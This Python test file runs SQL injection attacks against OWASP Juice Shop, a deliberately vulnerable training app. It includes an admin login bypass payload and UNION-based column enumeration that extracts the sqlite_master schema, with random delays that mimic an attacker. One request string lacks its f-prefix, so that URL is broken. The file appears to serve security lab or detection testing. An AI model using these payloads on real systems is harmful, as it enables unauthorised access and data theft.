import requests as r
import jwt
import json
import time
import random
from config import config

#config.JUICE_URL = 'http://127.0.0.1:80'
headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0',
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br',
    'Content-Type': 'application/json',
    'Origin': f'{config.JUICE_URL}/',
    'Connection': 'keep-alive',
    'Referer': f'{config.JUICE_URL}/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
}

def test_admin_auth_bypass():
    json_data = {
        'email': "admin@juice-sh.op'-- -",
        'password': 'password',
    }

    res = r.post(f'{config.JUICE_URL}/rest/user/login', headers=headers, json=json_data)
    time.sleep(random.random() + random.randint(2,4))

    token = json.loads(res.text.strip())['authentication']['token']
    jwt_data = jwt.decode(token, options={"verify_signature": False})
    email, success = jwt_data['data']['email'], jwt_data['status']
    assert email == "admin@juice-sh.op" and success == "success"

def test_exfiltrate_schema():
    # simulate attacker checking for sql payloads
    r.get(f'{config.JUICE_URL}/rest/products/search?q=%27;', headers=headers)
    time.sleep(random.random() + random.randint(2,4))

    r.get(f'{config.JUICE_URL}/rest/products/search?q=%27)--', headers=headers)
    time.sleep(random.random() + random.randint(2,4))

    r.get(f'{config.JUICE_URL}/rest/products/search?q=%27))--', headers=headers)
    time.sleep(random.random() + random.randint(2,4))

    # Enumerating columns with UNION injection
    for i in range(1,10):
        cols = ",".join([f"'{x}'" for x in range(1,i)])
        res = r.get(f"{config.JUICE_URL}/rest/products/search?q=%27)) UNION SELECT {cols}--", headers=headers)
        time.sleep(random.random() + random.randint(1,2))

    # Page leaks that DB is sqlite --> exfiltrate schema
    res = r.get("{config.JUICE_URL}/rest/products/search?q=asdf')) UNION SELECT sql, '2', '3', '4', '5', '6', '7', '8', '9' FROM sqlite_master--", headers=headers)
    time.sleep(random.random() + random.randint(2,4))

    schema_data = json.loads(res.text.strip())

    assert schema_data['data'][1]['id'] == 'CREATE TABLE `Addresses` (`UserId` INTEGER REFERENCES `Users` (`id`) ON DELETE NO ACTION ON UPDATE CASCADE, `id` INTEGER PRIMARY KEY AUTOINCREMENT, `fullName` VARCHAR(255), `mobileNum` INTEGER, `zipCode` VARCHAR(255), `streetAddress` VARCHAR(255), `city` VARCHAR(255), `state` VARCHAR(255), `country` VARCHAR(255), `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL)'
